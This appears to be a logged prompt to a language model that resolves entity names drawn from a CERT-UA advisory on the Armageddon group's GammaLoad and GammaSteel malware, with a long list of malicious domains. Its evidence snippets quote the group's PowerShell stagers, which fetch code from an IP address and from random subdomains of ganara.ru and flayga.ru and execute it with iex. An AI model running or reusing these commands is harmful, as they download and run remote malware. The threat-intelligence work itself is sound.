=== REQUEST (ollama gemma4:31b) ===
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. GammaLoad [aka GammaLoad.PS1]
E2. TRYxaEbX.ps1
E3. GammaLoad.PS1_v2
E4. stage1.ps1
E5. OUTSTEEL
E6. z.ps1
E7. stage2.ps1
E8. GraphSteel
E9. POWERGAP
E10. TRYxaEbX_2.ps1
E11. .NET Framework
E12. MarsStealer
E13. microsoft-cortana.exe
E14. GrimPlant
E15. dhdhk0k34.com
E16. Internet Explorer
E17. JesterStealer
E18. FTPGetter
E19. Formbook/XLoader v2.5
E20. Hashcat
E21. needrestart
E22. Meterpreter
E23. DarkCrystal RAT
E24. Pterodo
E25. PowerShell [aka powershell.exe]
E26. 223329.exe
E27. ckZ89.ExE
E28. 62ea.exe
E29. SPECTR.Shell
E30. 966449.exe
E31. MS PowerPoint
E32. GammaSteel.NET
E33. HarvesterX
E34. PowerShell (powershell.exe)
E35. GammaSteel.PS1
E36. surname192.temp.swtest.ru
E37. acteran.ru
E38. bilitora.ru
E39. a0695487.xsph.ru
E40. apoxipodes.ru
E41. fishitor.ru
E42. a0698649.xsph.ru
E43. tiloraso.ru
E44. a0698262.xsph.ru
E45. billyhot.ru
E46. dodortar.ru
E47. candidar.ru
E48. lnk-upload.dodortar.ru
E49. motocheck.in
E50. stormpredictor.host
E51. mulleti.ru
E52. erwini.ru
E53. meteolink.host
E54. successilin.top
E55. tortunas.ru
E56. ryomy.ru
E57. bul-opros.top
E58. iol.pt
E59. toknowall.com
E60. gopoppers.com
E61. kopratiso.ru
E62. co-opros.top
E63. podologaneri.it
E64. districoperav.icu
E65. potrakit.ru
E66. giraffe-tour.ru
E67. rivierafamily.com
E68. nitikora.ru
E69. omyce.ru
E70. tridiuma.ru
E71. yandex.ru
E72. varanasiclick.ru
E73. leonardis.ru
E74. olei.ro
E75. www.msftncsi.com
E76. s8.h.mchost.ru
E77. jevejosader.top
E78. enlamentedeunasesor.com
E79. emterox.ru
E80. milotrad.ru
E81. milotraf.ru
E82. lingrevelat.com
E83. aspe.ro
E84. pastebin.com
E85. jokotras.ru
E86. afi-opros.top
E87. nikotod.ru
E88. mitraseo.hol.es
E89. parodadoca.ru
E90. marmaris.com.ua
E91. xsph.ru
E92. nx0.ru
E93. ncscc.gov.ua
E94. staystrongjewels.com
E95. wi-opros.top
E96. xcasinobonuses.net
E97. ns2-dns.com
E98. servebeer.com
E99. evil.server.com
E100. 3utilities.com
E101. ns.ns2-dns.com
E102. agreminj.com
E103. ns3-dns.com
E104. airmauritiusticket.com
E105. cloudflare-dns.com
E106. ftp.thefoodplace.net
E107. bounceme.net
E108. ddns.net
E109. mail.nais-gov.org
E110. plexbd.net
E111. sytes.net
E112. brunoboys.net
E113. alt-2cdn.net
E114. viewdns.net
E115. dcshost.net
E116. gov-ua.info
E117. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E118. dyndns.com
E119. ns.ns3-dns.com
E120. webknives.com
E121. www.facebook.com
E122. www.michiganmastereltiempo.com
E123. eoiw8lhjwuc3sh2.m.pipedream.net
E124. www.symantec.com
E125. eo9p1d2bfmioiot.m.pipedream.net
E126. anniversarygiftsforcouples.com
E127. atlantar.ru
E128. motoristo.ru
E129. moolin.ru
E130. bubenci.ru
E131. callsol.ru
E132. clipperso.ru
E133. cooperi.ru
E134. detroito.ru
E135. farafauler.ru
E136. flayga.ru
E137. ganara.ru
E138. hawksi.ru
E139. hofsteder.ru
E140. kilitro.ru
E141. kurapat.ru
E142. lnasfe.ru
E143. lopasts.ru
E144. mafirti.ru
E145. metanat.ru
E146. mitlubald.ru
E147. paparat.ru
E148. pasamart.ru
E149. qkcew.ru
E150. rncsq.ru
E151. tarlit.ru
E152. tbwelo.ru
E153. wicksl.ru
E154. xcqef.ru
E155. nxkad.ru
E156. dnslookup.seowebchecker.com
E157. tools.nexcess.net
E158. viewdns.info
E159. www.portcheckers.com
E160. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
M2. "GammaSteel.NET" (Software) — options: E1, E11, E5, E3 — ctx: S1
M3. "HarvesterX" (Software) — options: E17, E18, E19, E12 — ctx: S1
M4. "PowerShell (powershell.exe)" (Software) — options: E25, E1, E26, E9 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E36, E37, E38, E39
M6. "atlantar.ru" (Domain) — options: E39, E46, E37, E42
M7. "motoristo.ru" (Domain) — options: E41, E43, E49, E37 — ctx: S8
M8. "moolin.ru" (Domain) — options: E51, E37, E52, E40
M9. "bubenci.ru" (Domain) — options: E55, E37, E52, E56
M10. "callsol.ru" (Domain) — options: E39, E45, E47, E37
M11. "clipperso.ru" (Domain) — options: E39, E37, E60, E44
M12. "cooperi.ru" (Domain) — options: E62, E37, E63, E44
M13. "detroito.ru" (Domain) — options: E44, E52, E38, E37
M14. "farafauler.ru" (Domain) — options: E39, E37, E66, E42
M15. "flayga.ru" (Domain) — options: E56, E37, E38, E41 — ctx: S4
M16. "ganara.ru" (Domain) — options: E66, E71, E38, E37 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E39, E52, E37, E42
M18. "hofsteder.ru" (Domain) — options: E76, E37, E77, E39
M19. "kilitro.ru" (Domain) — options: E79, E38, E37, E41
M20. "kurapat.ru" (Domain) — options: E42, E65, E45, E37
M21. "lnasfe.ru" (Domain) — options: E39, E83, E69, E37 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E40, E61, E84, E37
M23. "mafirti.ru" (Domain) — options: E52, E51, E37, E41
M24. "metanat.ru" (Domain) — options: E44, E65, E53, E37
M25. "mitlubald.ru" (Domain) — options: E39, E80, E37, E42
M26. "paparat.ru" (Domain) — options: E40, E65, E89, E37 — ctx: S5
